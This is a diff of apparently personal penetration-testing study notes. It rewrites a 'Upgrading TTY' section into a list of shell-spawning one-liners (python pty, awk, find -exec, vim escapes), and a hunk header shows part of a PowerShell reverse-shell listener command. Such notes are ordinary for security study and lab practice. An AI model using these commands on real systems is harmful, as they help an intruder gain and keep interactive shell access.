@@ -91,13 +91,18 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.So
 
 ## Upgrading TTY
 To give us more terminal features (eg. a prompt, mouse, history, etc) we need to upgrade the TTY. Often when creating a shell via an application user eg. `apache`, no shell interpreter language has been defined in the environment variables for that user. This means that we need to spawn our own TTY to gain these functionalities.
-
+### Python
+```shell
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+```shell
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
 ### Interactive
 ```shell
 /bin/sh -i
 /bin/bash -i
 ```
-
 ### Perl
 ```shell
 perl -e 'exec "/bin/sh";'
@@ -114,59 +119,30 @@ ruby -e 'exec "/bin/sh"'
 # Run inside a ruby script
 exec "/bin/sh"
 ```
-
 ### Lua
 ```lua
 os.execute('/bin/sh')
 ```
-
-There are multiple methods to do this. For our purposes, we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:
-
+### AWK
 ```shell
-python -c 'import pty; pty.spawn("/bin/sh")'
+awk 'BEGIN {system("/bin/sh")}'
 ```
-
+### Find
 ```shell
-python3 -c 'import pty; pty.spawn("/bin/sh")'
+# If it finds the file, then it will execute a shell
+find / -name [file_name] -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+find . -exec /bin/sh \; -quit
 ```
-
-After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:
+### VIM
 ```shell
-www-data@remotehost$ ^Z
-
-alipali737@htb[/htb]$ stty raw -echo
-alipali737@htb[/htb]$ fg
-
-[Enter]
-[Enter]
-www-data@remotehost$
+vim -c ':!/bin/sh'
 ```
-
-Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.
-
-We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximise the windows or use any size we want, and then input the following commands to get our variables:
-
 ```shell
-alipali737@htb[/htb]$ echo $TERM
-
-xterm-256color
+# VIM escape
+vim
+:set shell=/bin/sh
+:shell
 ```
-
-```shell
-alipali737@htb[/htb]$ stty size
-
-67 318
-```
-
-The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:
-
-```shell
-www-data@remotehost$ export TERM=xterm-256color
-
-www-data@remotehost$ stty rows 67 columns 318
-```
-
-Once we do that, we should have a `netcat` shell that uses the terminal's full features, just like an SSH connection.
 
 ## Web Shells
 This is a web script that accepts commands through HTTP params, executes the command and returns the output. There are two components to using these: Uploading the web shell and executing the shell.
